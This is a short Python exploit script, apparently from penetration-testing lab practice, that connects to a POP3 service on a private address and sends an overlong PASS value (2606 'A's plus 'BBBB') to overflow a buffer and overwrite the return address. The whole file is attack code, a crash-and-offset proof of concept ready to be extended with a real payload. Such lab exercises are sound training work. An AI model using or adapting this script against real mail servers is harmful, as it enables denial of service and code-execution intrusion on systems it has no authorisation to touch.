#!/usr/bin/python
import sys
import socket

shellcode = "A" * 2606 + "B" * 4

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.11.23.92',110))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS ' + shellcode + '\r\n')
	s.send('QUIT\r\n')
	s.close()

except:
	print "Error connecting to POP3 port."
	sys.exit()